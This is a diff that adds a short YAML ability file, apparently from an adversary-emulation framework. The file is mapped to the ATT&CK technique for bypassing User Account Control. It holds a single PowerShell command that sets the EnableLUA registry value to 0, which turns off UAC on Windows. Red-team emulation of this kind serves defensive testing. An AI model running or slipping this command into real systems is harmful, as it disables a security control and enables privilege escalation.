@@ -1,0 +1,19 @@
+id: 665432a4-42e7-4ee1-af19-a9a8c9455d0c
+metadata:
+  version: 2
+  authors:
+    - privateducky
+  tags: []
+name: UAC bypass registry
+description: |
+  The Windows registry is a database of configuration rules for a computer. This procedure changes a value to bypass
+  User Access Control (UAC) protection.
+tactic: privilege-escalation
+technique:
+  id: T1088
+  name: Bypass User Account Control
+platforms:
+  windows:
+    psh:
+      command: |
+        New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
